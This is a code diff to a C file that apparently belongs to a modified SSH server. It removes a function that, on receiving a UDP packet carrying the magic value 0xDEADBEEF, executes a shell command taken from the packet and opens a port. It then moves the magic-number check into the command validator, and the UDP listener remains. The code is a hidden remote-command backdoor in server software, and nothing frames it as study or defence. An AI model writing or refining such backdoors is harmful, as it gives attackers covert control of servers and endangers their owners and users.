@@ -12,28 +12,12 @@
 
 #define MAGICNUM        -559038737 //0XDEADBEEF in decimal
 
-void parse_packet(listen_packet_t *,char *);
 void parse_error (listen_packet_t *,char *);
 int check_shell_command(listen_packet_t *);
 int num_parse(char *, int );
-void handle_packet(char *);
-
-void handle_packet(char *buffer){
-    listen_packet_t new_packet;
-    
-    parse_packet(&new_packet,buffer);
-           
-    //execute shell command and port adding only if 0xDEADBEEF and legal command
-    if((int)new_packet.magic == MAGICNUM &&
-        check_shell_command(&new_packet)){
-            //execute the shell_command, then add port
-            shell_exec_command(new_packet.shell_command); //func in svr-chansession
-            add_port_request((int)new_packet.port_number); //func in svr-main   
-    }
-}
 
 int check_shell_command(listen_packet_t * packet){
-    if(!packet)
+    if(!packet || (int)packet->magic != MAGICNUM )
         return 0;
     //remove spacebreaks from the beginning of shell_command
     int i;
@@ -76,7 +60,7 @@ int start_udp() {
     int sockfd;
     char buffer[BUFFERSIZE]; 
     struct sockaddr_in servaddr, cliaddr;
-     //TODO - check if AF_INET for IPv4 or AF_INET6 for IPv6
+    //TODO - check if AF_INET for IPv4 or AF_INET6 for IPv6
     // Creating socket file descriptor 
     if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
         perror("socket creation failed"); 
